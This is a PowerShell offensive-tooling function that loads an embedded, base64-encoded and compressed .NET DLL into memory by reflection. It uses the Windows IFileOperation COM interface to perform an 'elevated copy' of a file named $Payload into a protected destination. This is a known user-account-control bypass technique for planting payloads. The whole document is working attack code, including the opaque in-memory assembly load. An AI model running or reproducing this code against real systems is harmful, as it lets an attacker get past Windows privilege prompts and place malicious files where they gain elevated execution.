function Elevated-CopyIFileOperation {
	param(
		[Parameter(Mandatory = $True)]
		[String]$Payload,
		[Parameter(Mandatory = $True)]
		[String]$DestinationPath,
		[Parameter(Mandatory = $True)]
		[String]$DestinationName
	)

    function Invoke-IFileOperation {
    <#
    .SYNOPSIS
        Bootstrap function to expose an IFileOperation COM interface to powershell (script-scope).
    
    .DESCRIPTION
        Author: Ruben Boonen (@FuzzySec)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
    
    .EXAMPLE
        C:\PS> Invoke-IFileOperation
        C:\PS> $IFileOperation.CopyItem("C:\Some\Dir\a.txt", "C:\Some\Other\Dir\", "b.txt")
        C:\PS> $IFileOperation.PerformOperations()
    #>
    
        # Compressed Dll which wraps the IFileOperation COM
        # Compression --> http://www.exploit-monday.com/2012/12/in-memory-dll-loading.html
        $EncodedCompressedFile = @'
        7Vt7fFx1lT/3kZnMJJk8GkoLAaZNS9PYhLzatFC0k8ykGTIvZiZ9YCXcmblJhk7mjvdO2oZSTBVRP4ACgqLAQl1YEFhhPwsfkccuAlbWFUHRBS0qiuKyvlBXF1Fkzzn3zp2ZJDzWP/y4n483ud/fOed3fud3fud3fr/7yE34nCtAAgAZz9dfB7gPzGMbvPUxj6fnlPs9cI/riVX3CaEnViWns4a3oGtTujLjTSv5vFb0plSvPpv3ZvNefzThndEyandDg3uNZSMWAAgJErT8/Ns7S3afh9XeOqEHAH/B    Ycry    EQQvnucx28S0aPoNUC7hJlNOhwTbPkiq9Fsu7YKPNrQbBdPutdLSg6zH4kch1H0bMbEP9K+2gq1FfrSC7y6qB4pYFrutcfWU/a4wcV63buhpsHxDH3mgfdV62/C3W1dzWtr0lSeGbG1apDe00M1YxCxHuUkNyDgxz3cACG9rkIuPV8WOZgC3dBkaOLGrTseiYLSg5AJTpC1DWmtFKFUeR5WidGg5lp0niwe5/JxZcpMNJ1UwHccjdap4IQn     +dBxJOleLrR01mCidp4pSa4eDKIBlPRLstXwyXcIucA5l8SKcbrljBUqKTqw7NEbCg4ReWby4SVuHBsSDpLrheNGsMFltLdYcCiMlb1huVsjaSrTTcQKN6R3c8Yk9NeAHjl     +z2IGZ5pA6PIhumYs6s51DOxGbOBlrWjWcT8f3Wp0bHE4Nc8z9nGODw2FSnUIbzUsrnHgauHks0AAbtpj0n9VXz5/blwxdZlpV91XZidyqdZN5d4VR8q/JtHXc6pItCTa8la1WbWChqZKd1lUlOw7Y8lZ2auSLTqLZN6cQV4Tj1Dfyb1W3afcs05hpRRukef2OePBsygihUzz  +0Nl2SmxoLiUIpYV2qt3KTNPOc8XW98WIbcSaogu7MU6m9D7fModu83o4BcHw0kLo/JruolWxCpl5XJvyRQQdq4mlxH2KjHS0U6M1JCPrnZh3lO+4bGkvb9YTaEGUL5NIFZPW7ZY6TqUV1+DQp7BK6lhHQlxsvDA6hxJnDQnWiqf9Y19fd0/3xp7BvkGS1EAO8WrUbL8ICVzLG4hOFPVsfsogjQ3oTgHL9vEEXN9u7q/t28eDlJt3Ij      +Aq7N9KKelSusRQ77zXZ85yUV72atCPyw39xtU5QnYjyfGE24xxwPoLfuAarwHS2bOV52VMhFK+1eP2ywdoNceaHDA9xkvdp7R0AjXNpD8TueqegeM1BKuYzzKeBXjHYzfYZ1rnbux7T5GN8sPNU7XOeBMB6FWR/iiTDjqnK5zw+eaPunBHht+JTjgK033YqvfYr8OSNeSzmq28yjjVD1JxhhfcZHkpAaiBxg7XYSH6qnHftZJYo80qkYemzlzTYjH6s5kTkDBFY3H6gIYCRn5JqyhujGL+6aLuDhNJWr   +sYE047AWbsKJ     +zJqAmjIHUHuaZfJbWHumNvkgtzDRwVqp0EEjXzR1Q8OxzbpcXHH/GHh3xEjDYRjMuHvmwjfx/TLNYQfqiNsdBKe6CL8NGPaTfge1iww/g9rHnAwXU/4TCPhXWznBsYOtv86y7/HkiG2s5ItnMH4ikR4JtcqjCcwOrl2PeNPWKeT5RHGWsYHWX6Qe7mW6XGm72T6fKbHmX6JfTif6RaWf53pK80IMH0G08Aefo/pHTzG23h0DrbwqofwnUx3Mi5nHOdWRdY/zL7JHOd1HB/ZjCHjT3lEvUwHGVc0E77GrT7D     Fm5H+Sp4qe5JxKOupxGXOR4Xe+E/6p5B7HceE5vhu/IzogCfkb8vlub3LPGHiO8Hwp8wfbVAeD9jH8tfMGmJ5axzEuMEy3uYvp3pJ5j+OLeaYbyFJTNc+2um383yjzA9yvQBpuvY/nuYXsn6I6ZNxJK3J0svIj4GhH8QCG9l+jXG5xkHWH4xYsxLK    +qSFesadMzqj5lc7X63givpk8y9KKhOB3KP2prEfdXm/ksU4Vmbe1mUILaKORite0WsgQct7ivuV8RaoH2duKvcr4t1ULS4u9xNeDV60OJ66mokD7S2m9xDuKc0w7r2si/NcC5zV8KL7gap2dpjr/Te6DheaoF9XHcYrpIduH9eaWqu6GpYJS2HLzF3VHjSQ3Ul7k7P2oq6eXendLzNfdTdJ51gc/e7z5ROsbmj7u1Su81trjtTWm9z/rqk1GVzN7hTUr/N3eHOShttbnldp7TF5jbUGdJWm/upZ14atrgXh    RdxPwzY3LEq7knmHrfi4qm/RCrVEXe5NAp/bC/P35gVs6M1485rpDK3x7lWCtlco+c6KWxzD9c0QcTmDrqOSFGbu7XhiBSzuQea1kpn29zv3P8gxW1un+eIlLC5q9x3Skmb2+a5V9ppc19xPyDttrldnqPSe2xutO4BacLmLse6tM3d5X5CUm0uhP1N2VxP3bekaZujzJopey13VHCUIXmbowwpc5Qhms1Rhug2Rxmy3      +YoQw7aHGXIYZujDPmgzVGGXGpzlCGX2xxlyJU2Rxlytc1Rhlxnc5QhN9jcsSruySrui/U/kMrc440/l47Y3AuOX1dwv2h4Rfp7mws7X5NuBrqMPuIiPGqjCL+qJ/oTNUQ/UEd3KMccbyYp0wJ8yUESt5N0fuwhyTUufkrEh0IBLmf7Z0tU+6xMtUcaCfs8JH/aTfKnHEtJZHA46Y7uDnlh7cfrqXZxq7K8Bl6rpTumN297+hu0vb1xqbbVdmacpF+pQxaqx1KWyPAxtvxdvo  +7De9PnLCqjjRXuknzwxz/E   +o5VhztexuXlnyfI3wy97LKQxF+uoZQYny6ieQPsSb6iZKcp0SL7IkE9XUkT3lKEq41vfWWvDV1cvYoqnV+/aY6ZbnAcpFGja3+5ABvKQ6kY+blonzwLsoH79vIB+8b5IP3beTDW7b9s/PBuygfTIn3beSDHR9aO9iLbK0gW/4AW/4Fr    +KHeJV9o1EEH3rhQ8tecMG6BoGuv3jVWInohvWITdDLuIXRxxhkPJtxN6OCeBxkmX4v4xcYv8jWvo54Aswx/W2Wz0HA2Q6fgnMbO+AHLGnl+   +yXIN84CL8CvWYrHIGgYwh+Dxc3juCTEd2nHAa6JxCE9mYNJXQf4xIucRyAZoEsXMl2PgUr4ELESccHENfDpai/s/FqRHfzdYixxptwpPVwN2IT3IvYCvcjroB/RWyDx4A2o39DXANfQ+yApxE3wLOIPfBdxAH4IeJm+AniVvgZ4jb02AV+  +B3iKPwBEa  +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    +6478dfw3H/wI=
'@
    
        # Decompress & load assembly
        $DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
        $UncompressedFileBytes = New-Object Byte[](14336)
        $DeflatedStream.Read($UncompressedFileBytes, 0, 14336) | Out-Null
        [Reflection.Assembly]::Load($UncompressedFileBytes) | Out-Null
    
        # PS C:\Users\b33f> $IFileOperation |Get-Member
        # 
        #    TypeName: FileOperation.FileOperation
        # 
        # Name              MemberType Definition
        # ----              ---------- ----------
        # CopyItem          Method     void CopyItem(string source, string destination, string newName)
        # DeleteItem        Method     void DeleteItem(string source)
        # Dispose           Method     void Dispose(), void IDisposable.Dispose()
        # Equals            Method     bool Equals(System.Object obj)
        # GetHashCode       Method     int GetHashCode()
        # GetType           Method     type GetType()
        # MoveItem          Method     void MoveItem(string source, string destination, string newName)
        # NewItem           Method     void NewItem(string folderName, string name, System.IO.FileAttributes attrs)
        # PerformOperations Method     void PerformOperations()
        # RenameItem        Method     void RenameItem(string source, string newName)
        # ToString          Method     string ToString()
    
        $Script:IFileOperation = New-Object FileOperation.FileOperation
    }
	
	# Load IFileOperation assembly
	Invoke-IFileOperation
	
	# Elevated copy, can be file or folder
	$IFileOperation.CopyItem($Payload,$DestinationPath,$DestinationName)
	$IFileOperation.PerformOperations()

}